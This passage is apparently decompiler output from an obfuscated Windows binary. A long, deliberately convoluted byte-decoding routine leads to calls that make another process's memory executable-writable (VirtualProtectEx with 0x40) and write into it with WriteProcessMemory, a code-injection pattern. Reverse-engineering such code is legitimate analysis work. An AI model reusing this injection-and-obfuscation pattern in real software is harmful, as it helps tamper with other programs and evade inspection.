            if (uVar8 != uVar9 + 2) {
              if (uVar8 != uVar9 + 3) {
                if (uVar8 != uVar9 + 4) {
                  if (uVar8 != uVar9 + 6) goto LAB_14000b610;
                  bVar10 = ('-' - (cVar4 - 0xfU & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) + uVar9 + 1;
                  goto LAB_14000b523;
                }
                bVar10 = cVar4 + (cVar4 + 0xb9U & bVar3) * -2 + -0x56 + bVar3;
                goto LAB_14000be87;
              }
              bVar10 = ('?' - (cVar4 + 0x6bU & bVar3)) * '\x02' + cVar4 + bVar3;
              goto LAB_14000be56;
            }
            bVar10 = (')' - (cVar4 + 0x1dU & bVar3)) * '\x02' + cVar4 + bVar3;
            goto LAB_14000b523;
          }
          bVar10 = cVar4 + (cVar4 + 0x33U & bVar3) * -2 + -0x32 + bVar3;
LAB_14000b610:
          while (uVar7 = uVar9, uVar6 < uVar9 + uVar8) {
            while( true ) {
              do {
                uVar9 = uVar7;
                if (uVar8 == uVar9 + 0x41) {
                  cVar11 = (':' - (cVar4 - 0x3eU & bVar3)) * '\x02' + cVar4;
                  goto LAB_14000bdf4;
                }
                if (uVar8 == uVar9 + 0x42) {
                  bVar10 = cVar4 + (cVar4 + 0x10U & bVar3) * -2 + -0x60 + bVar3;
                  uVar9 = uVar9 + 1;
                  goto LAB_14000b523;
                }
                if (uVar8 == uVar9 + 5) {
                  bVar10 = cVar4 + (cVar4 + 0x5eU & bVar3) * -2 + -0x34 + bVar3;
                  goto LAB_14000b523;
                }
                if (uVar8 == uVar9 + 0x61) {
                  bVar10 = cVar4 + (cVar4 + 0xacU & bVar3) * -2 + -8 + bVar3;
                  goto LAB_14000be56;
                }
                if (uVar8 == uVar9 + 0x28) {
                  bVar10 = ('\x12' - (cVar4 - 6U & bVar3)) * '\x02' + cVar4 + bVar3;
                  goto LAB_14000be87;
                }
                if (uVar8 == uVar9 + 3) {
                  bVar10 = ('(' - (cVar4 + 0x48U & bVar3)) * '\x02' + cVar4 + bVar3;
                  goto LAB_14000be8a;
                }
                if (uVar8 == uVar9 + 0x400) {
                  bVar10 = ('>' - (cVar4 + 0x96U & bVar3)) * '\x02' + cVar4 + bVar3;
                  goto LAB_14000bd32;
                }
                if (uVar8 == uVar9 + 0x10) {
                  bVar10 = cVar4 + (cVar4 - 0x1cU & bVar3) * -2 + -0x58 + bVar3;
                  goto LAB_14000beb8;
                }
                if (uVar8 == uVar9 + 1) {
                  bVar10 = cVar4 + (cVar4 + 0x32U & bVar3) * -2 + -0x2c + bVar3;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) + uVar9 + 1;
                  goto LAB_14000b523;
                }
                uVar7 = uVar9;
              } while (uVar8 == uVar9 + 0x200);
              uVar8 = uVar9 + 0x2a;
              uVar7 = uVar9 + 0x33;
              if (uVar8 < uVar9 + 0xb3) {
                bVar10 = ('!' - (cVar4 - 0xbU & bVar3)) * '\x02' + bVar3 + cVar4;
                goto LAB_14000b510;
              }
              if (uVar8 < uVar9 + 0x3b) {
                bVar10 = ('7' - (cVar4 + 0x43U & bVar3)) * '\x02' + bVar3 + cVar4;
                goto LAB_14000b520;
              }
              if (uVar8 < uVar9 + 0x74) {
                bVar10 = cVar4 + (cVar4 + 0x91U & bVar3) * -2 + -0x66 + bVar3;
                uVar9 = uVar7;
                goto LAB_14000b533;
              }
              if (uVar8 < uVar9 + 0x75) {
                bVar10 = cVar4 + (cVar4 - 0x21U & bVar3) * -2 + -0x3a + bVar3;
                uVar9 = uVar7;
                goto LAB_14000b5a0;
              }
              if (uVar8 < uVar9 + 0x38) break;
              if (uVar8 < uVar9 + 0x94) {
                bVar10 = cVar4 + 0x7b;
                cVar11 = '\x0f';
                uVar9 = uVar7;
                goto LAB_14000b9c9;
              }
              if (uVar8 < uVar9 + 0x5b) {
                bVar10 = cVar4 - 0x37;
                cVar11 = '%';
                uVar9 = uVar7;
                goto LAB_14000b98b;
              }
              if (uVar8 < uVar9 + 0x36) {
                bVar10 = cVar4 + 0x17;
                cVar11 = ';';
                uVar9 = uVar7;
                goto LAB_14000b951;
              }
              if (uVar8 < uVar9 + 0x433) {
                bVar10 = cVar4 + (cVar4 + 0x65U & bVar3) * -2 + -0x5e + bVar3;
                uVar9 = uVar7;
                goto LAB_14000b939;
              }
              if (uVar9 + 0x43 <= uVar8) {
                uVar8 = uVar9 + 0x41b;
                uVar7 = uVar9 + 0x41c;
                if (uVar9 + 0x426 < uVar8) {
                  bVar10 = ('\b' - (cVar4 + 0x28U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) + uVar7 + 1;
                  uVar9 = uVar7;
                  goto LAB_14000b523;
                }
                if (uVar9 + 0x446 < uVar8) {
                  bVar10 = ('\x1e' - (cVar4 + 0x76U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000beb8;
                }
                if (uVar9 + 0x49c < uVar8) {
                  bVar10 = ('4' - (cVar4 - 0x3cU & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000bd32;
                }
                if (uVar9 + 0x424 < uVar8) {
                  bVar10 = cVar4 + (cVar4 + 0x12U & bVar3) * -2 + -0x6c + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000be8a;
                }
                if (uVar9 + 0x45d < uVar8) {
                  bVar10 = cVar4 + (cVar4 + 0x60U & bVar3) * -2 + -0x40 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000be87;
                }
                if (uVar9 + 0x45e < uVar8) {
                  bVar10 = cVar4 + (cVar4 + 0xaeU & bVar3) * -2 + -0x14 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000be56;
                }
                if (uVar9 + 0x421 < uVar8) {
                  bVar10 = ('\f' - (cVar4 - 4U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar9 = uVar7;
                  goto LAB_14000b523;
                }
                if (uVar9 + 0x47d < uVar8) {
                  bVar10 = cVar4 + 0x4a;
                  cVar11 = '\"';
                  uVar9 = uVar7;
                  goto LAB_14000be25;
                }
                if (uVar9 + 0x444 < uVar8) {
                  cVar11 = ('8' - (cVar4 + 0x98U & bVar3)) * '\x02' + cVar4;
                  uVar9 = uVar7;
                  goto LAB_14000bdf4;
                }
                if (uVar8 <= uVar9 + 0x41f) {
                  uVar8 = uVar9 + 0x43c;
                  uVar7 = uVar9 + 0x83c;
                }
              }
            }
            bVar10 = cVar4 + (cVar4 + 0x2dU & bVar3) * -2 + -0xe + bVar3;
            uVar9 = uVar7;
          }
          if (uVar8 < uVar9 + 0x61) {
            bVar10 = cVar4 + 0x27;
            cVar11 = '\v';
LAB_14000b9c9:
            bVar10 = (cVar11 - (bVar10 & bVar3)) * '\x02' + cVar4 + bVar3;
LAB_14000b9d5:
            if (uVar9 + uVar8 == 0x41) {
              bVar10 = ('\x0e' - (cVar4 + 0x26U & bVar3)) * '\x02' + cVar4;
              goto LAB_14000bd32;
            }
            if (uVar9 + 6 < uVar8) {
              bVar10 = cVar4 + 0x4b;
              cVar11 = '\x1f';
LAB_14000b98b:
              bVar10 = (cVar11 - (bVar10 & bVar3)) * '\x02' + cVar4 + bVar3;
            }
            else {
              if (uVar8 == uVar9 + 1) {
                cVar11 = ('5' - (cVar4 + 0x99U & bVar3)) * '\x02' + cVar4;
                goto LAB_14000bdf4;
              }
              if (uVar8 == uVar9 + 2) {
                bVar10 = cVar4 + (cVar4 + 0x35U & bVar3) * -2 + -0x3e + bVar3;
                goto LAB_14000b523;
              }
              if (uVar8 == uVar9 + 3) {
                bVar10 = ('\r' - (cVar4 - 0x2fU & bVar3)) * '\x02' + cVar4 + bVar3;
                goto LAB_14000be87;
              }
              if (uVar8 == uVar9 + 7) {
                bVar10 = ('9' - (cVar4 + 0x6dU & bVar3)) * '\x02' + cVar4 + bVar3;
                goto LAB_14000bd32;
              }
            }
            if (uVar8 < 0x80) {
              if (uVar9 + 0x5a < uVar8) {
                bVar10 = cVar4 + 0x7e;
                cVar11 = '\x06';
LAB_14000b951:
                bVar10 = (cVar11 - (bVar10 & bVar3)) * '\x02' + cVar4 + bVar3;
              }
              else {
                if (uVar8 == uVar9 + 1) {
                  bVar10 = ('\x1c' - (cVar4 - 0x34U & bVar3)) * '\x02' + cVar4 + bVar3;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) + uVar9 + 1;
                  goto LAB_14000b523;
                }
                if (uVar8 == uVar9 + 3) {
                  bVar10 = cVar4 + (cVar4 + 0x68U & bVar3) * -2 + -0x70 + bVar3;
LAB_14000bd32:
                  bVar1 = bVar3 + (bVar3 & cVar4 + 0x4dU) * -2 + -0x1b + cVar4 + 0x4dU;
                  *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) = bVar1;
                  uVar6 = uVar6 - ((ulonglong)bVar1 + uVar9 + 1);
                  uVar9 = uVar9 + 1;
LAB_14000beb8:
                  bVar1 = (char)uVar6 + 0x74;
                  *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) =
                       bVar3 + (bVar3 & bVar1) * -2 + -0x2c + bVar1;
                  uVar8 = uVar8 + 1;
                  lVar5 = uVar6 + (-1 - uVar8);
                  uVar6 = lVar5 + *(byte *)((longlong)local_a8 + lVar5 + -0x70) + uVar9 + 1;
                  goto LAB_14000b523;
                }
                if (uVar8 == uVar9 + 5) {
                  bVar10 = cVar4 + (cVar4 + 4U & bVar3) * -2 + -0x18 + bVar3;
                  goto LAB_14000be87;
                }
                if (uVar8 == uVar9 + 2) {
                  cVar11 = cVar4 + (cVar4 + 0x3cU & bVar3) * -2 + -0x68;
                  goto LAB_14000bdf4;
                }
              }
              if (uVar9 < 10) {
LAB_14000b939:
                *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) = bVar10;
                uVar6 = uVar6 + 1;
                goto LAB_14000b523;
              }
              bVar10 = (cVar4 + (cVar4 + 0x8aU & bVar3) * -2 + bVar3) * '\x02' + 0x88;
LAB_14000bdf7:
              *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) =
                   bVar3 + (bVar3 & cVar4 + 0xb1U) * -2 + ')' + cVar4 + 0xb1U;
              uVar9 = uVar9 + 1;
              goto LAB_14000b523;
            }
            bVar10 = bVar3 * '\x02' + (cVar4 - 0x28U & bVar3) * -2 + -0x10 + cVar4;
          }
          else {
            if (uVar8 == uVar9 + 1) {
              bVar10 = cVar4 + (cVar4 + 0x66U & bVar3) * -2 + -100 + bVar3;
              uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) + uVar9 + 1;
              goto LAB_14000b523;
            }
            if (uVar8 == uVar9 + 3) {
              bVar10 = cVar4 + (cVar4 + 2U & bVar3) * -2 + -0xc + bVar3;
              goto LAB_14000bd32;
            }
            if (uVar8 != uVar9 + 5) {
              if (uVar8 != uVar9 + 9) goto LAB_14000b9d5;
              cVar11 = cVar4 + (cVar4 - 0x2aU & bVar3) * -2 + -4;
LAB_14000bdf4:
              bVar10 = cVar11 + bVar3;
              goto LAB_14000bdf7;
            }
            bVar10 = ('<' - (cVar4 - 0x14U & bVar3)) * '\x02' + cVar4 + bVar3;
          }
LAB_14000be56:
          *(byte *)((longlong)local_a8 + (uVar6 - 0x70)) =
               bVar3 + (bVar3 & cVar4 - 1U) * -2 + '\a' + bVar10 + (cVar4 - 1U);
LAB_14000be87:
          uVar8 = uVar8 + uVar9;
LAB_14000be8a:
          uVar6 = uVar6 - bVar10;
          goto LAB_14000b523;
        }
        in_stack_011b0d43 = local_118;
LAB_14000bf68:
        VirtualProtectEx(hProcess,param_4,(longlong)in_stack_011b0d43,0x40,local_a8);
        WriteProcessMemory(hProcess,param_4,local_70,lStack_68 - (longlong)local_70,(SIZE_T *)0x0);
        local_f8 = 0x23223d2c;
        local_f4 = 0;
        uStack_ec = 0;
        local_e4 = 0;
        local_e2 = 0;
LAB_14000bfc2:
        uVar7 = DAT_140a618d0;
        uVar8 = DAT_140a618c8;
LAB_14000bfd0:
        uVar6 = 0;
        uVar9 = uVar7;
LAB_14000bfd3:
        if (uVar6 < 0x17) {
          bVar10 = *(byte *)((longlong)local_a8 + (uVar6 - 0x50));
LAB_14000bfe3:
          if (uVar6 < uVar8) goto LAB_14000cb39;
          cVar4 = (char)uVar6;
          if (uVar9 + 1 <= uVar8) {
            if (uVar8 == uVar9 + 1) {
              local_148[0] = (cVar4 + 0x72U + bVar10 + (bVar10 & cVar4 + 0x72U) * -2) - 0x1e;
              uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) + uVar9 + 1;
            }
            else {
              if (uVar8 == uVar9 + 2) {
                local_148[0] = cVar4 + -0x3c + bVar10 + (bVar10 & cVar4 + 10U) * -2;
                goto LAB_14000ca63;
              }
              if (uVar8 == uVar9 + 3) {
                local_148[0] = cVar4 + 0xa2U + bVar10 + (bVar10 & cVar4 + 0xa2U) * -2 + 0x92;
                goto LAB_14000ca2d;
              }
              if (uVar8 == uVar9 + 5) {
                local_148[0] = (cVar4 - 0x12U) + ('?' - (bVar10 & cVar4 - 0x12U)) * '\x02' + bVar10;
                goto LAB_14000c9f8;
              }
              if (uVar8 != uVar9 + 7) goto LAB_14000c050;
              local_148[0] = cVar4 + bVar10 + (cVar4 + 0x3aU & bVar10) * -2 + 0xa4;
            }
            goto LAB_14000bfd3;
          }
          local_148[0] = bVar10 + (bVar10 & cVar4 + 0x26U) * -2 + -10 + cVar4 + 0x26U;
LAB_14000c050:
          if (uVar6 < uVar9) {
            in_stack_011b0cb6 = in_stack_0159c890;
            goto LAB_14000cb39;
          }
          if (uVar9 + 0x80 <= uVar8) {
            if (uVar8 == uVar9 + 1) {
              cVar11 = bVar10 + (cVar4 + 0x6aU & bVar10) * -2 + -0x7c;
              goto LAB_14000c995;
            }
            if (uVar8 != uVar9 + 3) {
              if (uVar8 != uVar9 + 4) {
                if (uVar8 != uVar9 + 9) goto LAB_14000c0c0;
                local_148[0] = ('\"' - (cVar4 - 0x36U & bVar10)) * '\x02' + bVar10 + cVar4;
                uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) + uVar9 + 1;
                goto LAB_14000bfd3;
              }
              local_148[0] = bVar10 + (cVar4 + 0x32U & bVar10) * -2 + -0x2c + cVar4;
              goto LAB_14000ca63;
            }
            local_148[0] = ('\x16' - (cVar4 + 0x4eU & bVar10)) * '\x02' + bVar10 + cVar4;
            goto LAB_14000c9f8;
          }
          local_148[0] = ('&' - (cVar4 + 0x1eU & bVar10)) * '\x02' + bVar10 + cVar4;
LAB_14000c0c0:
          while (uVar7 = uVar9, uVar6 < uVar9 + uVar8) {
            while( true ) {
              do {
                uVar9 = uVar7;
                if (uVar8 == uVar9 + 0x42) {
                  cVar11 = ('\x04' - (cVar4 + 0x54U & bVar10)) * '\x02' + bVar10;
                  goto LAB_14000c995;
                }
                if (uVar8 == uVar9 + 3) {
                  local_148[0] = (' ' - (cVar4 + 0xa0U & bVar10)) * '\x02' + bVar10 + cVar4;
                  uVar9 = uVar9 + 1;
                  goto LAB_14000bfd3;
                }
                if (uVar8 == uVar9 + 0x200) {
                  local_148[0] = ('<' - (cVar4 - 0x14U & bVar10)) * '\x02' + bVar10 + cVar4;
                  goto LAB_14000bfd3;
                }
                if (uVar8 == uVar9 + 6) {
                  bVar3 = cVar4 + 0x38;
                  goto LAB_14000c6ac;
                }
                if (uVar8 == uVar9 + 0x1000) {
                  local_148[0] = (cVar4 + bVar10 + (cVar4 + 0x84U & bVar10) * -2) - 0x18;
                  goto LAB_14000ca2d;
                }
                if (uVar8 == uVar9 + 10) {
                  local_148[0] = ('\x10' - (cVar4 - 0x30U & bVar10)) * '\x02' + bVar10 + cVar4;
                  goto LAB_14000ca30;
                }
                if (uVar8 == uVar9 + 0x41) {
                  local_148[0] = (',' - (cVar4 + 0x1cU & bVar10)) * '\x02' + bVar10 + cVar4;
                  goto LAB_14000ca63;
                }
                if (uVar8 == uVar9 + 0x28) {
                  local_148[0] = bVar10 + (cVar4 + 0x68U & bVar10) * -2 + -0x70 + cVar4;
                  goto LAB_14000ca88;
                }
                if (uVar8 == uVar9 + 1) {
                  local_148[0] = (cVar4 + bVar10 + (cVar4 + 0xb4U & bVar10) * -2) - 0x38;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) + uVar9 + 1;
                  goto LAB_14000bfd3;
                }
                uVar7 = uVar9;
              } while (uVar8 == uVar9 + 100);
              uVar8 = uVar9 + 0x7a;
              uVar7 = uVar9 + 0x7e;
              if (uVar8 < uVar9 + 0x9e) {
                local_148[0] = ('*' - (cVar4 + 0x72U & bVar10)) * '\x02' + bVar10 + cVar4;
                goto LAB_14000bfc2;
              }
              if (uVar8 < uVar9 + 0xa8) {
                local_148[0] = cVar4 + bVar10 + (cVar4 + 0xbeU & bVar10) * -2 + 0x8c;
                goto LAB_14000bfd0;
              }
              if (uVar8 < uVar9 + 0xc0) {
                local_148[0] = bVar10 + (cVar4 + 10U & bVar10) * -2 + -0x3c + cVar4;
                uVar9 = uVar7;
                goto LAB_14000bfe3;
              }
              if (uVar8 < uVar9 + 0x81) {
                local_148[0] = bVar10 + (cVar4 + 0x56U & bVar10) * -2 + -4 + cVar4;
                uVar9 = uVar7;
                goto LAB_14000c050;
              }
              if (uVar8 < uVar9 + 0x27e) break;
              if (uVar8 < uVar9 + 0x84) {
                bVar3 = cVar4 - 0x12;
                cVar11 = '6';
                uVar9 = uVar7;
                goto LAB_14000c4a2;
              }
              if (uVar8 < uVar9 + 0x107e) {
                cVar11 = bVar10 + (cVar4 + 0x3aU & bVar10) * -2 + -0x5c;
                uVar9 = uVar7;
                goto LAB_14000c463;
              }
              if (uVar8 < uVar9 + 0x88) {
                cVar11 = bVar10 + (cVar4 + 0x86U & bVar10) * -2 + -0x24;
                uVar9 = uVar7;
                goto LAB_14000c427;
              }
              if (uVar8 < uVar9 + 0xbf) {
                local_148[0] = ('\n' - (cVar4 - 0x2eU & bVar10)) * '\x02' + bVar10 + cVar4;
                uVar9 = uVar7;
                goto LAB_14000c406;
              }
              if (uVar9 + 0xa6 <= uVar8) {
                uVar8 = uVar9 + 0x47e;
                uVar7 = uVar9 + 0x47f;
                if (uVar9 + 0x488 < uVar8) {
                  local_148[0] = cVar4 + bVar10 + (cVar4 + 0x90U & bVar10) * -2 + 0xa0;
                  uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) + uVar7 + 1;
                  uVar9 = uVar7;
                  goto LAB_14000bfd3;
                }
                if (uVar9 + 0x4f9 < uVar8) {
                  local_148[0] = bVar10 + (cVar4 - 0x24U & bVar10) * -2 + -0x28 + cVar4;
                  uVar9 = uVar7;
                  goto LAB_14000ca88;
                }
                if (uVar9 + 0x49f < uVar8) {
                  local_148[0] = ('\b' - (cVar4 + 0x28U & bVar10)) * '\x02' + bVar10 + cVar4;
                  uVar9 = uVar7;
                  goto LAB_14000ca63;
                }
                if (uVar9 + 0x4a9 < uVar8) {
                  local_148[0] = ('$' - (cVar4 + 0x74U & bVar10)) * '\x02' + bVar10 + cVar4;
                  uVar9 = uVar7;
                  goto LAB_14000ca30;
                }
                if (uVar9 + 0x4c1 < uVar8) {
                  local_148[0] = cVar4 + bVar10 + (cVar4 - 0x40U & bVar10) * -2 + 0x80;
                  uVar9 = uVar7;
                  goto LAB_14000ca2d;
                }
                if (uVar9 + 0x482 < uVar8) {
                  local_148[0] = bVar10 + (cVar4 + 0xcU & bVar10) * -2 + -0x48 + cVar4;
                  uVar9 = uVar7;
                  goto LAB_14000c9f8;
                }
                if (uVar9 + 0x67f < uVar8) {
                  local_148[0] = (cVar4 + bVar10 + (cVar4 + 0x58U & bVar10) * -2) - 0x10;
                  uVar9 = uVar7;
                  goto LAB_14000bfd3;
                }
                if (uVar9 + 0x485 < uVar8) {
                  local_148[0] = ('\x14' - (cVar4 + 0xa4U & bVar10)) * '\x02' + bVar10 + cVar4;
                  uVar9 = uVar9 + 0x480;
                  goto LAB_14000bfd3;
                }
                if (uVar9 + 0x147f < uVar8) {
                  cVar11 = ('0' - (cVar4 - 0x10U & bVar10)) * '\x02' + bVar10;
                  uVar9 = uVar7;
                  goto LAB_14000c995;
                }
                if (uVar8 <= uVar9 + 0x489) {
                  uVar8 = uVar9 + 0x4ff;
                  uVar7 = uVar9 + 0x540;
                }
              }
            }
            local_148[0] = ('\x1a' - (cVar4 + 0xa2U & bVar10)) * '\x02' + bVar10 + cVar4;
            uVar9 = uVar7;
          }
          if (uVar8 < uVar9 + 6) {
            bVar3 = cVar4 + 0x26;
            cVar11 = '\x0e';
LAB_14000c4a2:
            local_148[0] = (cVar11 - (bVar3 & bVar10)) * '\x02' + bVar10 + cVar4;
LAB_14000c4ae:
            if (uVar9 + uVar8 == 0x42) {
              local_148[0] = (cVar4 + 0xbcU & bVar10) * -2 + -0x68 + cVar4;
LAB_14000ca63:
              bVar3 = (cVar4 - 0x1eU) + (cVar4 - 0x1eU & bVar10) * -2 + -0x2e + bVar10;
              *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) = bVar3;
              uVar6 = uVar6 - ((ulonglong)bVar3 + uVar9 + 1);
              uVar9 = uVar9 + 1;
LAB_14000ca88:
              bVar3 = (char)uVar6 + 8;
              *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) =
                   bVar3 + (bVar3 & bVar10) * -2 + -0x38 + bVar10;
              uVar8 = uVar8 + 1;
              lVar5 = uVar6 + (-1 - uVar8);
              uVar6 = lVar5 + *(byte *)((longlong)local_a8 + lVar5 + -0x50) + uVar9 + 1;
              goto LAB_14000bfd3;
            }
            if (uVar9 + 0x61 < uVar8) {
              cVar11 = bVar10 + (cVar4 + 0xeU & bVar10) * -2 + -0x54;
LAB_14000c463:
              local_148[0] = cVar11 + cVar4;
LAB_14000c466:
              if (uVar8 < 0x20) {
                if (uVar9 + 1000 < uVar8) {
                  cVar11 = bVar10 + (cVar4 + 0x2cU & bVar10) * -2 + -8;
LAB_14000c427:
                  local_148[0] = cVar11 + cVar4;
                }
                else {
                  if (uVar8 == uVar9 + 1) {
                    local_148[0] = ('\x18' - (cVar4 + 0x78U & bVar10)) * '\x02' + bVar10 + cVar4;
                    uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) + uVar9 + 1;
                    goto LAB_14000bfd3;
                  }
                  if (uVar8 == uVar9 + 2) {
                    local_148[0] = ('4' - (cVar4 - 0x3cU & bVar10)) * '\x02' + bVar10 + cVar4;
                    goto LAB_14000ca88;
                  }
                  if (uVar8 == uVar9 + 2) {
                    local_148[0] = bVar10 + (cVar4 + 0x10U & bVar10) * -2 + -0x60 + cVar4;
                    goto LAB_14000ca63;
                  }
                  if (uVar8 == uVar9 + 3) {
                    local_148[0] = (cVar4 + bVar10 + (cVar4 + 0x5cU & bVar10) * -2) - 0x28;
                    goto LAB_14000ca30;
                  }
                  if (uVar8 == uVar9 + 5) {
                    local_148[0] = ('\b' - (cVar4 + 0xa8U & bVar10)) * '\x02' + bVar10 + cVar4;
                    goto LAB_14000ca2d;
                  }
                  if (uVar8 == uVar9 + 6) {
                    local_148[0] = cVar4 + bVar10 + (cVar4 + 0x8cU & bVar10) * -2 + 0xb8;
                    uVar9 = uVar9 + 1;
                    goto LAB_14000bfd3;
                  }
                  if (uVar8 == uVar9 + 8) {
                    cVar11 = bVar10 + (cVar4 - 0x28U & bVar10) * -2 + -0x10;
                    goto LAB_14000c995;
                  }
                }
                if (uVar9 < 9) {
LAB_14000c406:
                  *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) = local_148[0];
                  uVar6 = uVar6 + 1;
                  goto LAB_14000bfd3;
                }
                local_148[0] = (('\x14' - (cVar4 + 0x24U & bVar10)) * '\x02' + bVar10 + cVar4) *
                               '\x02';
LAB_14000c998:
                *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) =
                     cVar4 + 0x4aU + (cVar4 + 0x4aU & bVar10) * -2 + -6 + bVar10;
                uVar9 = uVar9 + 1;
                goto LAB_14000bfd3;
              }
              local_148[0] = ((bVar10 - (cVar4 + 0x70U & bVar10)) + '0') * '\x02' + cVar4;
            }
            else {
              if (uVar8 == uVar9 + 1) {
                cVar11 = bVar10 + (cVar4 + 0x5aU & bVar10) * -2 + -0x1c;
LAB_14000c995:
                local_148[0] = cVar11 + cVar4;
                goto LAB_14000c998;
              }
              if (uVar8 == uVar9 + 2) {
                local_148[0] = ('*' - (cVar4 - 0xeU & bVar10)) * '\x02' + bVar10 + cVar4;
                goto LAB_14000bfd3;
              }
              if (uVar8 != uVar9 + 3) {
                if (uVar8 == uVar9 + 4) {
                  local_148[0] = (cVar4 + bVar10 + (cVar4 + 0x8aU & bVar10) * -2) - 0x3c;
                  goto LAB_14000ca2d;
                }
                if (uVar8 == uVar9 + 6) {
                  local_148[0] = (cVar4 + bVar10 + (cVar4 - 0x2aU & bVar10) * -2) - 4;
                  goto LAB_14000ca30;
                }
                if (uVar8 == uVar9 + 2) {
                  local_148[0] = ('6' - (cVar4 + 0x6eU & bVar10)) * '\x02' + bVar10 + cVar4;
                  goto LAB_14000ca88;
                }
                goto LAB_14000c466;
              }
              local_148[0] = bVar10 + (cVar4 + 0x3eU & bVar10) * -2 + -0x74 + cVar4;
            }
LAB_14000c9f8:
            *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) =
                 cVar4 + 0x96U + (cVar4 + 0x96U & bVar10) * -2 + -0x1a + local_148[0] + bVar10;
          }
          else {
            if (uVar8 == uVar9 + 1) {
              local_148[0] = cVar4 + bVar10 + (cVar4 + 0x3cU & bVar10) * -2 + 0x98;
              uVar6 = uVar6 + *(byte *)((longlong)local_a8 + (uVar6 - 0x50)) + uVar9 + 1;
              goto LAB_14000bfd3;
            }
            if (uVar8 == uVar9 + 3) {
              local_148[0] = ('\x04' - (cVar4 - 0x2cU & bVar10)) * '\x02' + bVar10 + cVar4;
              goto LAB_14000ca63;
            }
            if (uVar8 == uVar9 + 2) {
              local_148[0] = (' ' - (cVar4 + 0x20U & bVar10)) * '\x02' + bVar10 + cVar4;
              goto LAB_14000ca30;
            }
            if (uVar8 != uVar9 + 5) {
              if (uVar8 == uVar9 + 4) {
                bVar3 = cVar4 + 0xb8;
LAB_14000c6ac:
                local_148[0] = bVar10 + (bVar3 & bVar10) * -2 + -0x50 + cVar4;
                goto LAB_14000c9f8;
              }
              if (uVar8 != uVar9 + 7) goto LAB_14000c4ae;
              cVar11 = (',' - (cVar4 + 0x9cU & bVar10)) * '\x02' + bVar10;
              goto LAB_14000c995;
            }
            local_148[0] = ('<' - (cVar4 + 0x6cU & bVar10)) * '\x02' + bVar10 + cVar4;
          }
LAB_14000ca2d:
          uVar8 = uVar8 + uVar9;
LAB_14000ca30:
          uVar6 = uVar6 - local_148[0];
          goto LAB_14000bfd3;
        }
        in_stack_011b0cb6 = local_f8;
LAB_14000cb39:
        VirtualProtectEx(hProcess,param_4,(longlong)in_stack_011b0cb6,local_a8[0],local_a8);
        uVar8 = 1;
        FUN_14000e3a0(&local_70);
        FUN_14000e3a0(&local_88);
        goto LAB_14000cb6a;
      }
      bVar3 = local_148[uVar6 + 0x10];
      if (uVar6 < uVar7) goto LAB_14000aa3f;
      cVar4 = (char)uVar6;
      if (uVar9 + 1 <= uVar7) {
        if (uVar7 != uVar9 + 1) {
          if (uVar7 == uVar9 + 2) {
            bVar10 = (bVar3 + cVar4 + 0x74U + (cVar4 + 0x74U & bVar3) * -2) - 0x2c;
          }
          else if (uVar7 == uVar9 + 3) {
            bVar10 = ('\x1e' - (cVar4 + 0x1cU & bVar3)) * '\x02' + cVar4 + 0x1cU + bVar3;
            uVar7 = uVar7 + uVar9;
          }
          else {
            if (uVar7 != uVar9 + 4) goto LAB_14000a250;
            bVar10 = bVar3 + (cVar4 - 0x3cU) + (cVar4 - 0x3cU & bVar3) * -2 + 0xa4;
LAB_14000a958:
            local_148[uVar6 + 0x10] =
                 ('*' - (cVar4 - 0xcU & bVar3)) * '\x02' + (cVar4 - 0xcU) + bVar3 + bVar10;
            uVar7 = uVar7 + uVar9;
          }
          goto LAB_14000a9af;
        }
        bVar10 = bVar3 + cVar4 + 0x7cU + (cVar4 + 0x7cU & bVar3) * -2 + 0x9c;
        uVar6 = uVar6 + local_148[uVar6 + 0x10] + uVar9 + 1;
        goto LAB_14000a1d2;
      }
      bVar10 = bVar3 + (bVar3 & cVar4 - 0x2cU) * -2 + '4' + (cVar4 - 0x2cU);
LAB_14000a250:
      if (uVar6 < uVar9) {
        in_stack_015ba90c = in_stack_017fc138;
        goto LAB_14000aa3f;
      }
      if (uVar9 + 0x5a <= uVar7) {
        if (uVar7 == uVar9 + 1) {
          cVar11 = bVar3 + (cVar4 + 0xcU & bVar3) * -2 + -0x48;
          goto LAB_14000a91b;
        }
        if (uVar7 != uVar9 + 3) {
          if (uVar7 != uVar9 + 7) {
            if (uVar7 != uVar9 + 4) goto LAB_14000a2b0;
            bVar10 = ('\x1c' - (cVar4 + 0x4cU & bVar3)) * '\x02' + bVar3 + cVar4;
            uVar6 = uVar6 + local_148[uVar6 + 0x10] + uVar9 + 1;
            goto LAB_14000a1d2;
          }
          cVar11 = ('\x14' - (cVar4 + 0xa4U & bVar3)) * '\x02' + bVar3;
          goto LAB_14000a8b0;
        }
        bVar10 = (cVar4 + bVar3 + (cVar4 + 0x5cU & bVar3) * -2) - 0x28;
        goto LAB_14000a1d2;
      }
